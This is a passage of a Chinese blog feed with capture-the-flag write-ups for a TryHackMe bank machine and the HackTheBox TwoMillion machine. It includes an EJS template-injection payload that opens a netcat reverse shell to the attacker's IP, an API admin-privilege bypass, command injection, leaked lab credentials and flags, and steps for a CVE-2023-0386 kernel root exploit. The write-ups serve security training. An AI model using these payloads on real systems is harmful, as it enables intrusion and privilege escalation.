class_">Cortez</span><span class="hljs-symbol">:olivi8</span><br></code></pre></td></tr></table></figure><p>可以看到一些账户信息但是看不到具体的，在 Message 页面能看到一些消息，而且可以发现 url 有 <code>?c=5</code> 这种，尝试改变页面，当 <code>?c=0</code> 时有管理员账户信息</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Gayle</span> <span class="hljs-title class_">Bev</span><span class="hljs-symbol">:p~</span>]P<span class="hljs-variable">@5</span>!<span class="hljs-number">6</span>;<span class="hljs-symbol">rs558:</span>q<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06d1a03a1b3e9912.png"></p><p>登录进去就能看到账户信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/83ba8e33fefd774e.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Tyrell</span> Wellick:<span class="hljs-number">842</span>-<span class="hljs-number">029</span>-<span class="hljs-number">5701</span><br></code></pre></td></tr></table></figure><h1 id="What-is-the-user-txt-flag"><a href="#What-is-the-user-txt-flag" class="headerlink" title="What is the user.txt flag?"></a>What is the user.txt flag?</h1><p><code>Setting</code> 栏可以修改用户账号密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/8a257a1fc4a3b305.png"></p><p>然后用 Bp 拦截，发现把 <code>password</code> 字段改了之后会回显报错</p><p><img src="https://img.dkdun.cn/v1/2025/12/801b2b1ac29262f7.png"></p><p><code>ejs</code> 报错,可以在网上搜到 CVE-2022-29078，<a href="https://xz.aliyun.com/news/11769">Ejs 模板引擎注入实现 RCE</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">name=admin&amp;password=<span class="hljs-number">111</span>&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;busybox nc <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">118</span>.<span class="hljs-number">213</span> <span class="hljs-number">1234</span> -e bash&#x27;);s<br></code></pre></td></tr></table></figure><p>监听拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">4</span>lways_upd4te_uR_d3p3nd3nc!<span class="hljs-number">3</span>s&#125;<br></code></pre></td></tr></table></figure><h1 id="What-is-the-root-txt-flag"><a href="#What-is-the-root-txt-flag" class="headerlink" title="What is the root.txt flag?"></a>What is the root.txt flag?</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> web on <span class="hljs-symbol">cyprusbank:</span><br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR</span><br><span class="hljs-string">    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>,<br>    mail_badpass<br><br><span class="hljs-title class_">User</span> web may run the following commands on <span class="hljs-symbol">cyprusbank:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm<br></code></pre></td></tr></table></figure><p>发现 <code>sudoedit</code> 可以 sudo 提权。后面的文件写不进去服了。。。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-TwoMillion</title>
    <link href="/2025/03/19/HTB-TwoMillion/"/>
    <url>/2025/03/19/HTB-TwoMillion/</url>
    
    <content type="html"><![CDATA[<p>API 越权、命令执行、CVE-2023-0386</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.221<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 21:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Did not follow redirect to http://2million.htb/<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=38870%PV=Y%DS=3%DC=T%G=Y%TM=67D8<br>OS:22FA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=2%ISR=10D%TI=Z%CI<br>OS:=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST<br>OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=<br>OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T<br>OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R<br>OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=<br>OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0<br>OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7F7%RUD=G)IE<br>OS:(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 8080/tcp)<br>HOP RTT       ADDRESS<br>1   0.28 ms   172.30.144.1<br>2   442.86 ms 10.10.16.1<br>3   442.97 ms 10.10.11.221<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 59.39 seconds<br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>f12 查看源码，找到了 <code>inviteapi.min.js</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> JavaScript <span class="hljs-built_in">file</span> loaded <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> /invite page that has <span class="hljs-built_in">to</span> <span class="hljs-built_in">do</span> <span class="hljs-keyword">with</span> invite codes?<br>:inviteapi.<span class="hljs-built_in">min</span>.js<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, d</span>) &#123;<br>    e = <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br>        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)<br>    &#125;<br>    ;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>, <span class="hljs-title class_">String</span>)) &#123;<br>        <span class="hljs-keyword">while</span> (c--) &#123;<br>            d[c.<span class="hljs-title function_">toString</span>(a)] = k[c] || c.<span class="hljs-title function_">toString</span>(a)<br>        &#125;<br>        k = [<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>            <span class="hljs-keyword">return</span> d[e]<br>        &#125;<br>        ];<br>        e = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\w+&#x27;</span><br>        &#125;<br>        ;<br>        c = <span class="hljs-number">1</span><br>    &#125;<br>    ;<span class="hljs-keyword">while</span> (c--) &#123;<br>        <span class="hljs-keyword">if</span> (k[c]) &#123;<br>            p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>), k[c])<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p<br>&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))<br><br></code></pre></td></tr></table></figure><p>反混淆后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyInviteCode</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">var</span> formData = &#123; <span class="hljs-string">&quot;code&quot;</span>: code &#125;;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">data</span>: formData,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/verify&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">makeInviteCode</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以发现路径名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What JavaScript function <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> invite page returns <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> hint <span class="hljs-keyword">about</span> how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> an invite code? Don&#x27;t include () <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> answer.<br>:makeInviteCode<br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POST 请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# curl -X POST http://2million.htb/api/v1/invite/generate<br>&#123;<span class="hljs-string">&quot;0&quot;</span>:200,<span class="hljs-string">&quot;success&quot;</span>:1,<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;NTZRSlMtNDJLSjYtSTZXSTYtR1U5Mkc=&quot;</span>,<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;encoded&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>然后 base 64 解码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">56QJS</span>-<span class="hljs-number">42</span>KJ6-I6WI6-GU92G<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The endpoint <span class="hljs-keyword">in</span> makeInviteCode <span class="hljs-keyword">returns</span> <span class="hljs-keyword">encrypted</span> data. That message provides another endpoint <span class="hljs-keyword">to</span> query. That endpoint <span class="hljs-keyword">returns</span> a code <span class="hljs-keyword">value</span> that <span class="hljs-keyword">is</span> encoded <span class="hljs-keyword">with</span> what very common binary <span class="hljs-keyword">to</span> <span class="hljs-type">text</span> <span class="hljs-keyword">encoding</span> <span class="hljs-keyword">format</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> that <span class="hljs-keyword">encoding</span>?<br>:base64<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>注册登录账号然后进去到 <code>ACCESS</code> 抓包</p><p><img src="https://img.dkdun.cn/v1/2025/12/a14a654b8af50b27.png"></p><p>路径 <code>/api/v1/user/vpn/generate</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path to the endpoint the page uses <span class="hljs-keyword">when</span> a user clicks on <span class="hljs-string">&quot;Connection Pack&quot;</span>?<br><span class="hljs-symbol">:/api/v1/user/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>访问接口 <code>/api/v1</code> 返回了很多其他接口</p><p><img src="https://img.dkdun.cn/v1/2025/12/2d7ad1e6dde9a058.png"></p><p>访问 <code>/api/v1/admin/settings/update</code> 接口返回了错误信息，加上 <code>Content-type:application/json</code>，用 <code>PUT</code> 方式请求</p><p><img src="https://img.dkdun.cn/v1/2025/12/3aa6b728dd077173.png"></p><p>提示没有 <code>email</code> 参数，设置 <code>email</code> 参数，为注册的 email </p><p><img src="https://img.dkdun.cn/v1/2025/12/dd7812022fe4fd51.png"></p><p>再次请求提示没有 <code>is_admin</code> 参数</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf67adf68542895d.png"></p><p>再设置 <code>is_admin</code> 参数为 1</p><p><img src="https://img.dkdun.cn/v1/2025/12/da66390cc4a6df62.png"></p><p>返回了用户信息，应该是越权成功了，GET 访问一下 <code>/api/v1/admin/auth</code> 返回了 <code>true</code> ，说明确实成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/ba02b821e91d349f.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">How many API endpoints are there under /api/v1/admin?<br>:3<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint can change a user account to an admin account?<br><span class="hljs-symbol">:/api/v1/admin/settings/update</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>POST 访问 <code>/api/v1/admin/vpn/generate</code>，返回</p><p><img src="https://img.dkdun.cn/v1/2025/12/90712f882cc62d7e.png"></p><p>然后随便填一个用户名也能返回，然后修改字段</p><p><img src="https://img.dkdun.cn/v1/2025/12/e26da4534dc9155a.png"></p><p>说明存在命令执行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint has a command injection vulnerability <span class="hljs-keyword">in</span> it?<br><span class="hljs-symbol">:/api/v1/admin/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>反弹一个 shell 监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3a92eac39faa3c3.png"></p><p>然后列出文件，找到了 <code>.env</code> 得到了用户和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/4128efc1253ad083.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">DB_HOST=<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br>DB_DATABASE=htb_prod<br>DB_USERNAME=admin<br>DB_PASSWORD=SuperDuperPass123<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">file</span> <span class="hljs-keyword">is</span> commonly used <span class="hljs-keyword">in</span> PHP applications <span class="hljs-keyword">to</span> store environment <span class="hljs-keyword">variable</span> values?<br>:env<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh 直接登录拿到 userflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit the flag located in the admin user&#x27;s home directory.<br>:efdaf<span class="hljs-number">723</span>f<span class="hljs-number">682</span>ab<span class="hljs-number">1</span>f<span class="hljs-number">854</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">76e7909794</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><p>登录提示有 email</p><p><img src="https://img.dkdun.cn/v1/2025/12/4f9a226d09f42536.png"></p><p>查找有 email 的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;mail&quot;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d7cbf874fffd1da.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> email address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sender <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email sent <span class="hljs-built_in">to</span> admin?<br>:ch4p@<span class="hljs-number">2</span>million.htb<br></code></pre></td></tr></table></figure><h1 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h1><p>查看 admin 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">From: ch4p &lt;ch4p@2million.htb&gt;<br>To: admin &lt;admin@2million.htb&gt;<br>Cc: g0blin &lt;g0blin@2million.htb&gt;<br>Subject: Urgent: Patch System OS<br>Date: Tue, 1 June 2023 10:45:22 -0700<br>Message-ID: &lt;9876543210@2million.htb&gt;<br>X-Mailer: ThunderMail Pro 5.2<br><br>Hey admin,<br><br>I<span class="hljs-string">&#x27;m know you&#x27;</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;</span>t get popped by that.<br><br>HTB Godfather<br></code></pre></td></tr></table></figure><p>可以看到其中有一个 <code>OverlayFS</code> 搜 CVE，关于 <code>Linux kernel CVE</code> ，Linux 内核</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2023</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability <span class="hljs-keyword">in</span> that allows <span class="hljs-keyword">an</span> attacker <span class="hljs-built_in">to</span> move <span class="hljs-built_in">files</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Overlay <span class="hljs-built_in">file</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">while</span> maintaining metadata like <span class="hljs-keyword">the</span> owner <span class="hljs-keyword">and</span> SetUID bits?<br>:CVE<span class="hljs-number">-2023</span><span class="hljs-number">-0386</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>开两个终端，把 CVE 传到靶机上，编译之后（编译会报错，但是不影响）在第一个终端输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuse ./ovlcap/lower ./gc<br></code></pre></td></tr></table></figure><p>第二个终端输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6e0210e649704aca.png"></p><p>拿到 root 权限</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:3a<span class="hljs-number">62869985</span>c7bf<span class="hljs-number">6157</span>abcb<span class="hljs-number">2661</span>ce<span class="hljs-number">6983</span><br></code></pre></td></tr></table></figure><h1 id="CVE-2023-0386"><a href="#CVE-2023-0386" class="headerlink" title="CVE-2023-0386"></a>CVE-2023-0386</h1><p>具体漏洞分析：<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/%EF%BC%8Chttps://github.com/chenaotian/CVE-2023-0386">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/，https://github.com/chenaotian/CVE-2023-0386</a></p><p>exploit：<a href="https://github.com/xkaneiki/CVE-2023-0386/">https://github.com/xkaneiki/CVE-2023-0386/</a></p><p>这个 CVE 主要是关于 Linux 内核的 <code>OverlayFS</code> 子系统，当用户将一个具有权限的文件从一个 nosuid 挂载点复制到另一个挂载点时，未经授权的攻击者可以执行 setuid 文件，导致权限提升。</p><p>漏洞触发逻辑是如果 <code>overlay</code> 文件系统发生了<code>copy-up</code> 操作（尝试修改下层文件，触发下层文件向上层拷贝）的时候，如果下层文件系统是一个用户文件系统（比如 fuse），可以自定义任何文件，但该文件系统存在限制（比如 nosuid），这个漏洞就允许将下层用户自定义的 suid 文件从一个 nosuid 文件系统拷贝到一个正常文件系统中，从而导致非法 suid 获取真正的 suid 特权，毕竟在文件拷贝的时候并不是单纯地只拷贝文件内容，还包括了文件的权限信息、时间戳等信息一起被拷贝。</p><p>FUSE 文件系统（Filesystem in Userspace）,Linux 下的用户态文件系统接口，允许用户在用户空间（而非内核空间）实现和运行自定义的文件系统。允许在用户层定义文件系统的一些回调函数比如 open、write 甚至 getattr 等文件元数据信息。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API越权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-命令执行</title>
    <link href="/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
